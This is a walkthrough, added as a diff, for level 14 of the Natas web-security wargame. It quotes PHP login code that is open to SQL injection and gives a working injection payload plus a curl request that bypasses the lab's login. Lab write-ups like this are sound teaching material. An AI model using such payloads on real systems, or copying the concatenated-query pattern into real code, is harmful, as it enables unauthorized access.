@@ -1,0 +1,38 @@
+Level 14
+--------
+
+Okay, now we see a more traditional username & password form. Let's
+check the source code to see if there are holes we can slip through.
+
+    if(array_key_exists("username", $_REQUEST)) {
+        $link = mysql_connect('localhost', 'natas14', '<censored>');
+        mysql_select_db('natas14', $link);
+
+        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+        if(array_key_exists("debug", $_GET)) {
+            echo "Executing query: $query<br>";
+        }
+
+        if(mysql_num_rows(mysql_query($query, $link)) > 0) {
+                echo "Successful login! The password for natas15 is <censored><br>";
+        } else {
+                echo "Access denied!<br>";
+        }
+        mysql_close($link);
+    } else {
+
+Okay, this is one of the most common errors: SQL injection. You should never
+write code like this because the attacker controls the value of `$_REQUEST["username"]`
+and `$_REQUEST["password"]`. We can use that to make the query return more than
+zero rows, which is all they check for.
+
+Also, check out the nifty helper tool for us: set `debug` and it'll output the query
+that gets executed, so you can see what you're doing a bit better.
+
+    - debug: `1`
+    - username: `natas14" or username not null;-- ` (don't forget the space after the 2nd dash, it is required in MySQL)
+    - password: must be set, but pick whatever you want (`pwnd`)
+
+    curl -u natas14:... \
+        'http://natas14.natas.labs.overthewire.org/index.php?username=natas14"%20OR%20username%20IS%20NOT%20NULL;%20--%20&password=pwnd&debug=1'
+    Successful login! The password for natas15 is ...
